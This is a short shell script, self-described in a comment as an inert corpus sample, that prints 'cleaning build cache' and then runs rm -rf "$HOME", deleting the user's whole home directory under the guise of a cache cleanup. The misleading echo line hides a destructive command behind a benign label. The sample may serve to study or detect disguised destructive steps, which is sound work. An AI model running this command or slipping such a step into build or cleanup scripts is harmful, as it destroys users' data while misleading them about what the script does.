#!/bin/sh
# Inert corpus sample: never executed. A "cleanup" step that removes the user's home.
set -e
echo "cleaning build cache"
rm -rf "$HOME"
